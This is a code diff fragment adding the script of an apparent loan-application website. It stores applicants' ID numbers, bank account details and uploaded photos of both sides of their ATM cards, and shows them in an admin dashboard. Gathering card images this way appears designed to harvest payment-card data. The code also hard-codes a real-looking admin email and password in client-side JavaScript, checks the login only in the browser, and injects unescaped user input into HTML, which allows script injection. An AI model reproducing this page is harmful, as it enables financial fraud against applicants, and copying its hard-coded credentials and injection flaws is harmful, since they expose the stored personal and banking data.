+                    data.cardBackUrl = await uploadCardImage(cardBackFile, 'back.jpg');
+                }
+
+                // Remove file inputs from data
+                delete data.cardFront;
+                delete data.cardBack;
+
+                await db.collection('applications').add(data);
+
+                // Send auto-reply email
+                emailjs.send("service_nimi93", "template_nimi93", {
+                    name: data.fullName,
+                    email: data.email
+                });
+
+                // Show success
+                document.getElementById('application-form').innerHTML = `
+                    <div class="success-screen">
+                        <div class="checkmark">✅</div>
+                        <h3 style="color: var(--primary-red); margin-bottom: 10px;">Application Submitted!</h3>
+                        <p style="color: #666; font-size: 0.9rem;">Thank you, <strong>${data.fullName}</strong>. We've received your application and sent a confirmation to <strong>${data.email}</strong>.</p>
+                        <p style="color: #666; font-size: 0.85rem; margin-top: 10px;">Our team will review your application and notify you via email.</p>
+                        <button class="btn btn-next" style="margin-top: 25px;" onclick="location.reload()">Back to Home</button>
+                    </div>
+                `;
+
+            } catch (error) {
+                console.error("Error: ", error);
+                alert('Error submitting application. Please try again.');
+                submitBtn.innerText = 'Submit Application';
+                submitBtn.disabled = false;
+            }
+        };
+
+        // Status Checker
+        async function checkStatus() {
+            const email = document.getElementById('status-email').value.trim();
+            const resultDiv = document.getElementById('status-result');
+            if (!email) {
+                alert('Please enter your email address.');
+                return;
+            }
+            resultDiv.style.display = 'block';
+            resultDiv.style.background = '#f0f0f0';
+            resultDiv.innerHTML = '<p style="color: #666;">Checking status...</p>';
+
+            try {
+                const snapshot = await db.collection('applications').where('email', '==', email).get();
+                if (snapshot.empty) {
+                    resultDiv.style.background = '#fff3f3';
+                    resultDiv.innerHTML = '<p style="color: var(--danger-red);">No application found for this email address.</p>';
+                } else {
+                    const app = snapshot.docs[0].data();
+                    const statusColors = {
+                        pending: '#6c757d',
+                        approved: '#28a745',
+                        rejected: '#dc3545',
+                        flagged: '#ffc107'
+                    };
+                    const color = statusColors[app.status] || '#333';
+                    resultDiv.style.background = '#f9f9f9';
+                    resultDiv.innerHTML = `
+                        <p style="font-size: 0.9rem; margin-bottom: 8px;">Application found for <strong>${app.fullName}</strong></p>
+                        <p style="font-size: 0.85rem; color: #666;">Loan Amount: <strong>R ${parseInt(app.loanAmount).toLocaleString()}</strong></p>
+                        <p style="margin-top: 10px;">Status: <span class="badge" style="background: ${color}; color: ${app.status === 'flagged' ? 'black' : 'white'};">${app.status}</span></p>
+                    `;
+                }
+            } catch (err) {
+                resultDiv.innerHTML = '<p style="color: red;">Error checking status. Please try again.</p>';
+            }
+        }
+
+        // Admin Logic
+        const ADMIN_EMAIL = "nimissolomon@gmail.com";
+        const ADMIN_PASS = "07048199203";
+
+        function showAdminLogin() {
+            document.getElementById('main-site').style.display = 'none';
+            document.getElementById('admin-section').style.display = 'block';
+        }
+
+        function hideAdmin() {
+            document.getElementById('main-site').style.display = 'block';
+            document.getElementById('admin-section').style.display = 'none';
+        }
+
+        function handleAdminLogin() {
+            const email = document.getElementById('admin-email').value;
+            const pass = document.getElementById('admin-password').value;
+            if (email === ADMIN_EMAIL && pass === ADMIN_PASS) {
+                document.getElementById('admin-login-form').style.display = 'none';
+                document.getElementById('admin-dashboard').style.display = 'block';
+                loadApplications();
+            } else {
+                alert('Invalid credentials');
+            }
+        }
+
+        function handleAdminLogout() {
+            document.getElementById('admin-login-form').style.display = 'block';
+            document.getElementById('admin-dashboard').style.display = 'none';
+            document.getElementById('admin-email').value = '';
+            document.getElementById('admin-password').value = '';
+            hideAdmin();
+        }
+
+        function loadApplications() {
+            db.collection('applications').orderBy('createdAt', 'desc').onSnapshot((snapshot) => {
+                const tbody = document.getElementById('applications-table-body');
+                tbody.innerHTML = '';
+
+                let total = 0, pending = 0, approved = 0, rejected = 0;
+
+                snapshot.forEach((doc) => {
+                    const app = doc.data();
+                    total++;
+                    if (app.status === 'pending') pending++;
+                    if (app.status === 'approved') approved++;
+                    if (app.status === 'rejected') rejected++;
+
+                    const date = app.createdAt ? app.createdAt.toDate().toLocaleDateString() : 'N/A';
+                    const rowId = `row-${doc.id}`;
+                    const detailId = `detail-${doc.id}`;
+
+                    // Main row
+                    const tr = document.createElement('tr');
+                    tr.onclick = () => toggleDetail(detailId);
+                    tr.innerHTML = `
+                        <td>${date}</td>
+                        <td>${app.fullName || 'N/A'}</td>
+                        <td>${app.phone || 'N/A'}</td>
+                        <td>R ${parseInt(app.loanAmount || 0).toLocaleString()}</td>
+                        <td><span class="badge badge-${app.status}">${app.status}</span></td>
+                        <td onclick="event.stopPropagation()">
+                            <button class="action-btn btn-approve" onclick="updateStatus('${doc.id}', 'approved', '${app.fullName}', '${app.email}')">Approve</button>
+                            <button class="action-btn btn-reject" onclick="updateStatus('${doc.id}', 'rejected', '${app.fullName}', '${app.email}')">Reject</button>
+                            <button class="action-btn btn-flag" onclick="updateStatus('${doc.id}', 'flagged', '${app.fullName}', '${app.email}')">Flag</button>
+                        </td>
+                    `;
+                    tbody.appendChild(tr);
+
+                    // Detail row
+                    const detailTr = document.createElement('tr');
+                    detailTr.className = 'detail-row';
+                    detailTr.id = detailId;
+                    detailTr.innerHTML = `
+                        <td colspan="6">
+                            <div class="detail-grid">
+                                <div class="detail-item"><label>Full Name</label><p>${app.fullName || 'N/A'}</p></div>
+                                <div class="detail-item"><label>ID Number</label><p>${app.idNumber || 'N/A'}</p></div>
+                                <div class="detail-item"><label>Date of Birth</label><p>${app.dob || 'N/A'}</p></div>
+                                <div class="detail-item"><label>Gender</label><p>${app.gender || 'N/A'}</p></div>
+                                <div class="detail-item"><label>Marital Status</label><p>${app.maritalStatus || 'N/A'}</p></div>
+                                <div class="detail-item"><label>Phone</label><p>${app.phone || 'N/A'}</p></div>
+                                <div class="detail-item"><label>Email</label><p>${app.email || 'N/A'}</p></div>
+                                <div class="detail-item"><label>Address</label><p>${app.address || 'N/A'}</p></div>
+                                <div class="detail-item"><label>Province</label><p>${app.province || 'N/A'}</p></div>
+                                <div class="detail-item"><label>Employment Status</label><p>${app.employmentStatus || 'N/A'}</p></div>
+                                <div class="detail-item"><label>Employer / Grant Info</label><p>${app.employerName || app.grantType || 'N/A'}</p></div>
+                                <div class="detail-item"><label>Income / Grant Amount</label><p>${app.income ? 'R ' + app.income : app.grantAmount ? 'R ' + app.grantAmount : 'N/A'}</p></div>
+                                <div class="detail-item"><label>Bank Name</label><p>${app.bankName || 'N/A'}</p></div>
+                                <div class="detail-item"><label>Account Number</label><p>${app.accountNumber || 'N/A'}</p></div>
+                                <div class="detail-item"><label>Account Type</label><p>${app.accountType || 'N/A'}</p></div>
+                                <div class="detail-item"><label>Loan Amount</label><p>R ${parseInt(app.loanAmount || 0).toLocaleString()}</p></div>
+                                <div class="detail-item"><label>Loan Purpose</label><p>${app.loanPurpose || 'N/A'}</p></div>
+                                <div class="detail-item"><label>Repayment Term</label><p>${app.repaymentTerm || 'N/A'}</p></div>
+                            </div>
+                            <div class="card-images">
+                                <div class="card-image-box">
+                                    <label>ATM Card - Front</label>
+                                    ${app.cardFrontUrl ? `<img src="${app.cardFrontUrl}" alt="Card Front">` : '<p style="font-size:0.8rem;color:#999;">No image uploaded</p>'}
+                                </div>
+                                <div class="card-image-box">
+                                    <label>ATM Card - Back</label>
+                                    ${app.cardBackUrl ? `<img src="${app.cardBackUrl}" alt="Card Back">` : '<p style="font-size:0.8rem;color:#999;">No image uploaded</p>'}
+                                </div>
+                            </div>
+                        </td>
+                    `;
+                    tbody.appendChild(detailTr);
+                });
+
+                document.getElementById('stat-total').innerText = total;
+                document.getElementById('stat-pending').innerText = pending;
+                document.getElementById('stat-approved').innerText = approved;
+                document.getElementById('stat-rejected').innerText = rejected;
+            });
+        }
+
+        function toggleDetail(id) {
+            const row = document.getElementById(id);
+            row.style.display = row.style.display === 'table-row' ? 'none' : 'table-row';
+        }
+
+        async function updateStatus(id, status, name, email) {
+            try {
+                await db.collection('applications').doc(id).update({ status });
+                if (status === 'approved') {
+                    emailjs.send("service_nimi93", "template_nimi90", {
+                        name: name,
+                        email: email
+                    });
+                }
+            } catch (error) {
+                console.error("Error updating status: ", error);
+            }
+        }
+    </script>
+</body>
+</html>
